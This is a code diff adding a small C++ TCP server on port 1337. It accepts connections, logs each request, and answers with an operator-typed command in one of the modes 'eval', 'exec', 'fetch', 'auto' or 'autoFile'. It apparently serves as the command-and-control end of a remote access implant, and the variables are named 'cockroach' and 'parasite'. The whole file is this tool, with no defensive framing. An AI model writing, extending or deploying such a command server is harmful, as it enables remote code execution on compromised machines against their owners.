@@ -1,0 +1,56 @@
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <vector>
+#include <iostream>
+#include <unistd.h>
+
+
+#define IP "127.0.0.1"
+#define PORT "1337"
+
+int main(int argc, char *argv[]) {
+  int cockroach, stingroach, larva;
+
+  cockroach = socket(AF_INET, SOCK_STREAM, 0);
+
+  struct in_addr ip;
+  sockaddr_in sockaddr;
+  sockaddr.sin_family = AF_INET;
+  inet_aton(IP, &ip);
+  sockaddr.sin_addr.s_addr = ip.s_addr;
+  sockaddr.sin_port = htons(atoi(PORT));
+
+  stingroach = bind(cockroach, (struct sockaddr*)&sockaddr, sizeof(sockaddr));
+ 
+  larva = listen(cockroach, 10);
+
+  for(;;) {
+    auto addrlen = sizeof(sockaddr);
+    int parasite = accept(cockroach, (struct sockaddr*)&sockaddr, (socklen_t*)&addrlen);
+
+    std::vector<char> buffer(2048);
+    auto bytesRead = read(parasite, &buffer[0], buffer.size());
+    std::string bufferOut (buffer.begin(), buffer.end());
+    std::cout << "Recv: " << bufferOut << std::endl;
+
+    std::string serverResponse = "HTTP/1.1 200 ok\r\n\r\n";
+    std::string input = "";
+    std::string mode = "";
+    std::cout << "Modes:\n"
+    "eval,exec,fetch,auto,autoFile" << std::endl;
+    std::getline(std::cin, mode);;
+    std::cout << "Write " << mode << " argument:" << std::endl;
+    mode += ":";
+    std::getline(std::cin, input);
+    serverResponse += mode;
+    serverResponse += input;
+    serverResponse += "\r\n\r\n\r\n";
+    send(parasite, serverResponse.c_str(), serverResponse.size(), 0);
+
+    close(parasite);
+  }
+
+
+  return 0;
+}
